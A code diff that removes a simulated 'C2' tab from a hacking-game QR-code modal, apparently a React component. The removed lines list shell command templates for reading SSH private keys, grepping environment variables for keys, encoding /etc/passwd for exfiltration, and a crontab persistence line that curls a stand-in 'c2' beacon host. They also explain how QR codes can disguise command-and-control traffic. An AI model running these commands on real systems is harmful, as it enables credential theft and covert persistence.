@@ -6,22 +6,7 @@ import { Input } from "@/components/ui/input";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { useGame } from '@/hooks/useGameSession';
-import { Download, Copy, Upload, QrCode, RefreshCw, Zap, Bot, Play, Key, CheckCircle, AlertCircle, Terminal, Radio, Send } from 'lucide-react';
-
-// C2 Command Templates - Inspired by QuickResponseC2
-// Stealthy command & control via QR code encoding
-const C2_COMMAND_TEMPLATES = [
-  { id: 'shell', name: 'Shell Command', template: 'whoami', description: 'Execute shell command on target' },
-  { id: 'sysinfo', name: 'System Info', template: 'uname -a && hostname && id', description: 'Gather system information' },
-  { id: 'network', name: 'Network Recon', template: 'ip addr && netstat -tuln', description: 'Network configuration' },
-  { id: 'files', name: 'File Listing', template: 'ls -la /tmp && find /home -name "*.txt" 2>/dev/null', description: 'List sensitive files' },
-  { id: 'env', name: 'Environment', template: 'env | grep -i key', description: 'Extract environment variables' },
-  { id: 'processes', name: 'Process List', template: 'ps aux --sort=-%mem | head -20', description: 'Running processes' },
-  { id: 'creds', name: 'Credential Hunt', template: 'cat ~/.ssh/id_rsa 2>/dev/null || echo "No SSH key"', description: 'Hunt for credentials' },
-  { id: 'download', name: 'Exfil File', template: 'base64 /etc/passwd', description: 'Base64 encode file for exfil' },
-  { id: 'persist', name: 'Persistence', template: 'echo "* * * * * curl http://c2/beacon" | crontab -', description: 'Install persistence' },
-  { id: 'custom', name: 'Custom Command', template: '', description: 'Enter your own command' },
-];
+import { Download, Copy, Upload, QrCode, RefreshCw, Zap, Bot, Play, Key, CheckCircle, AlertCircle } from 'lucide-react';
 
 // QR Action Templates - Mirror real security tools with game intents
 // These match real-world CTF/OSINT patterns for authenticity
@@ -105,12 +90,6 @@ export const QRCodeModal = ({ open, onOpenChange }: QRCodeModalProps) => {
   const [sessionInput, setSessionInput] = useState('');
   const [sessionStatus, setSessionStatus] = useState<'idle' | 'success' | 'error'>('idle');
   const [sessionMessage, setSessionMessage] = useState('');
-  const [c2Command, setC2Command] = useState('whoami');
-  const [c2CommandQR, setC2CommandQR] = useState<string | null>(null);
-  const [c2Results, setC2Results] = useState<Array<{ id: number; command: string; result: string; timestamp: string }>>([]);
-  const [c2CommandIndex, setC2CommandIndex] = useState(0);
-  const [c2SelectedTemplate, setC2SelectedTemplate] = useState('shell');
-  const [c2ServerStatus, setC2ServerStatus] = useState<'offline' | 'online' | 'waiting'>('offline');
 
   const generateQR = async () => {
     setLoading(true);
@@ -265,55 +244,6 @@ export const QRCodeModal = ({ open, onOpenChange }: QRCodeModalProps) => {
     setLoading(false);
   };
 
-  const generateC2CommandQR = async () => {
-    setLoading(true);
-    try {
-      const c2Payload = {
-        type: 'c2_command',
-        id: c2CommandIndex,
-        cmd: c2Command,
-        encoding: 'base64',
-        timestamp: new Date().toISOString()
-      };
-      const response = await fetch('/api/qr/secret', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ 
-          secretId: `c2-cmd-${c2CommandIndex}`, 
-          hint: JSON.stringify(c2Payload)
-        })
-      });
-      const data = await response.json();
-      setC2CommandQR(data.qrCode);
-      setC2CommandIndex(prev => prev + 1);
-      setC2ServerStatus('waiting');
-    } catch (error) {
-      console.error('Failed to generate C2 command QR:', error);
-    }
-    setLoading(false);
-  };
-
-  const simulateC2Result = () => {
-    const simulatedResults: Record<string, string> = {
-      'whoami': 'nexus-agent',
-      'uname -a && hostname && id': 'Linux nexus-host 5.15.0 #1 SMP x86_64 GNU/Linux\\nnexus-host\\nuid=1000(agent) gid=1000(agent)',
-      'ip addr && netstat -tuln': 'eth0: 192.168.1.100/24\\nActive connections: 22/tcp, 80/tcp, 443/tcp',
-      'ls -la /tmp && find /home -name "*.txt" 2>/dev/null': 'total 16\\ndrwxrwxrwt 2 root root 4096\\n-rw-r--r-- 1 agent agent 156 secrets.txt\\n/home/agent/notes.txt',
-      'env | grep -i key': 'API_KEY=sk-redacted...\\nSECRET_KEY=hidden',
-      'ps aux --sort=-%mem | head -20': 'USER PID %MEM COMMAND\\nagent 1234 5.2 nexus-agent\\nroot 1 0.1 systemd',
-    };
-    
-    const result = simulatedResults[c2Command] || `Command executed: ${c2Command}\\nOutput: [simulated response]`;
-    
-    setC2Results(prev => [...prev, {
-      id: c2CommandIndex - 1,
-      command: c2Command,
-      result,
-      timestamp: new Date().toISOString()
-    }]);
-    setC2ServerStatus('online');
-  };
-
   return (
     <Dialog open={open} onOpenChange={onOpenChange}>
       <DialogContent className="bg-[#0a0500] border-amber-900/50 text-stone-300 font-mono max-w-2xl">
@@ -340,9 +270,6 @@ export const QRCodeModal = ({ open, onOpenChange }: QRCodeModalProps) => {
             </TabsTrigger>
             <TabsTrigger value="agent" className="data-[state=active]:bg-amber-900/50 data-[state=active]:text-amber-400">
               <Bot className="w-3 h-3 mr-1" /> Agent
-            </TabsTrigger>
-            <TabsTrigger value="c2" className="data-[state=active]:bg-red-900/50 data-[state=active]:text-red-400">
-              <Radio className="w-3 h-3 mr-1" /> C2
             </TabsTrigger>
             <TabsTrigger value="import" className="data-[state=active]:bg-amber-900/50 data-[state=active]:text-amber-400">
               Decode
@@ -595,173 +522,6 @@ export const QRCodeModal = ({ open, onOpenChange }: QRCodeModalProps) => {
                 <span>• crypto (cipher challenge)</span>
                 <span>• raw (raw data)</span>
               </div>
-            </div>
-          </TabsContent>
-
-          <TabsContent value="c2" className="space-y-4 mt-4 max-h-[60vh] overflow-y-auto">
-            {/* C2 Overview */}
-            <div className="p-4 bg-red-950/20 rounded border border-red-900/30">
-              <h3 className="text-red-400 font-bold mb-2 flex items-center gap-2">
-                <Radio className="w-4 h-4" /> QuickResponse C2 Framework
-              </h3>
-              <p className="text-xs text-stone-400 mb-3">
-                Inspired by real C2 frameworks, this tool encodes commands into QR codes for stealthy 
-                command & control operations. In NEXUS, use this for CTF challenges, campaign missions, 
-                and multiplayer stealth objectives.
-              </p>
-              <div className="flex items-center gap-2">
-                <span className={`w-2 h-2 rounded-full ${
-                  c2ServerStatus === 'online' ? 'bg-green-500 animate-pulse' : 
-                  c2ServerStatus === 'waiting' ? 'bg-yellow-500 animate-pulse' : 'bg-red-500'
-                }`} />
-                <span className="text-xs text-stone-500">
-                  Server: {c2ServerStatus === 'online' ? 'Agent Connected' : 
-                          c2ServerStatus === 'waiting' ? 'Awaiting Response' : 'Standby'}
-                </span>
-              </div>
-            </div>
-
-            {/* Command Template Selector */}
-            <div className="space-y-2">
-              <label className="text-xs uppercase tracking-widest text-red-700 flex items-center gap-2">
-                <Terminal className="w-3 h-3" /> Command Template
-              </label>
-              <Select 
-                value={c2SelectedTemplate} 
-                onValueChange={(value) => {
-                  setC2SelectedTemplate(value);
-                  const template = C2_COMMAND_TEMPLATES.find(t => t.id === value);
-                  if (template && template.template) setC2Command(template.template);
-                }}
-              >
-                <SelectTrigger className="bg-black/50 border-red-900/30 text-red-500">
-                  <SelectValue placeholder="Select command template" />
-                </SelectTrigger>
-                <SelectContent className="bg-[#0a0500] border-red-900/50">
-                  {C2_COMMAND_TEMPLATES.map((template) => (
-                    <SelectItem 
-                      key={template.id} 
-                      value={template.id}
-                      className="text-red-500 focus:bg-red-900/30 focus:text-red-400"
-                    >
-                      {template.name}
-                    </SelectItem>
-                  ))}
-                </SelectContent>
-              </Select>
-              <p className="text-xs text-stone-600">
-                {C2_COMMAND_TEMPLATES.find(t => t.id === c2SelectedTemplate)?.description}
-              </p>
-            </div>
-
-            {/* Command Input */}
-            <div className="space-y-2">
-              <label className="text-xs uppercase tracking-widest text-red-700">Command to Execute</label>
-              <Input
-                value={c2Command}
-                onChange={(e) => setC2Command(e.target.value)}
-                className="bg-black/50 border-red-900/30 text-red-500 font-mono"
-                placeholder="Enter shell command..."
-                data-testid="c2-command-input"
-              />
-            </div>
-
-            {/* Generate & Simulate Buttons */}
-            <div className="flex gap-2">
-              <Button 
-                onClick={generateC2CommandQR} 
-                disabled={loading || !c2Command}
-                className="flex-1 bg-red-700 hover:bg-red-600 text-white font-bold"
-                data-testid="generate-c2-qr"
-              >
-                <QrCode className="w-4 h-4 mr-2" />
-                {loading ? 'ENCODING...' : 'ENCODE COMMAND'}
-              </Button>
-              <Button 
-                onClick={simulateC2Result}
-                disabled={!c2CommandQR}
-                variant="outline"
-                className="border-red-800 text-red-600 hover:bg-red-950/30"
-                data-testid="simulate-c2-result"
-              >
-                <Play className="w-4 h-4 mr-2" /> Simulate
-              </Button>
-            </div>
-
-            {/* Generated QR */}
-            {c2CommandQR && (
-              <div className="flex flex-col items-center gap-3 p-4 bg-black/30 rounded border border-red-900/20">
-                <img src={c2CommandQR} alt="C2 Command QR" className="w-40 h-40" />
-                <p className="text-xs text-stone-500">Command #{c2CommandIndex - 1}: {c2Command.substring(0, 30)}...</p>
-                <Button variant="outline" size="sm" onClick={() => {
-                  if (c2CommandQR) {
-                    const link = document.createElement('a');
-                    link.href = c2CommandQR;
-                    link.download = `c2-cmd-${c2CommandIndex - 1}.png`;
-                    link.click();
-                  }
-                }} className="border-red-800 text-red-600">
-                  <Download className="w-4 h-4 mr-2" /> Download
-                </Button>
-              </div>
-            )}
-
-            {/* Results History */}
-            {c2Results.length > 0 && (
-              <div className="space-y-2">
-                <label className="text-xs uppercase tracking-widest text-red-700">Execution History</label>
-                <div className="max-h-32 overflow-y-auto space-y-2">
-                  {c2Results.slice(-5).reverse().map((result) => (
-                    <div key={result.id} className="p-2 bg-black/50 rounded border border-red-900/20 text-xs">
-                      <div className="flex justify-between text-stone-500 mb-1">
-                        <code className="text-red-400">$ {result.command}</code>
-                        <span>{new Date(result.timestamp).toLocaleTimeString()}</span>
-                      </div>
-                      <pre className="text-stone-400 whitespace-pre-wrap">{result.result}</pre>
-                    </div>
-                  ))}
-                </div>
-              </div>
-            )}
-
-            {/* Gameplay Integration Guide */}
-            <div className="p-4 bg-stone-900/30 rounded border border-stone-800">
-              <h4 className="text-amber-500 font-bold mb-3 flex items-center gap-2">
-                <Zap className="w-4 h-4" /> Gameplay Integration
-              </h4>
-              <div className="space-y-3 text-xs text-stone-400">
-                <div className="p-2 bg-black/30 rounded">
-                  <p className="text-teal-400 font-bold mb-1">Campaign: Shadow Protocol</p>
-                  <p>Use C2 QR codes to exfiltrate data from simulated corporate targets. Each successful command reveals clues for the next mission stage.</p>
-                </div>
-                <div className="p-2 bg-black/30 rounded">
-                  <p className="text-purple-400 font-bold mb-1">Multiplayer: Stealth Race</p>
-                  <p>Compete to encode/decode C2 commands fastest. First player to extract all target data wins. QR codes add realistic tradecraft.</p>
-                </div>
-                <div className="p-2 bg-black/30 rounded">
-                  <p className="text-amber-400 font-bold mb-1">CTF Challenge: Dead Drop</p>
-                  <p>Leave encoded commands as QR "dead drops" for teammates. Decode incoming result QRs to piece together the flag.</p>
-                </div>
-                <div className="p-2 bg-black/30 rounded">
-                  <p className="text-red-400 font-bold mb-1">Training: Red Team Ops</p>
-                  <p>Practice encoding recon commands, persistence mechanisms, and data exfil payloads - all skills used by real penetration testers.</p>
-                </div>
-              </div>
-            </div>
-
-            {/* How It Works */}
-            <div className="p-3 bg-black/30 rounded border border-stone-800">
-              <p className="text-xs text-stone-500 font-bold mb-2">HOW QR C2 WORKS</p>
-              <ol className="text-xs text-stone-500 space-y-1 list-decimal list-inside">
-                <li>Attacker encodes command → QR code (command.png)</li>
-                <li>Target polls server, downloads & decodes QR</li>
-                <li>Command executes, result encoded → QR</li>
-                <li>Result QR uploaded, attacker decodes response</li>
-                <li>All traffic appears as normal image downloads</li>
-              </ol>
-              <p className="text-xs text-red-400 mt-2 italic">
-                * In NEXUS, this is simulated for educational purposes. No real systems are targeted.
-              </p>
             </div>
           </TabsContent>
 
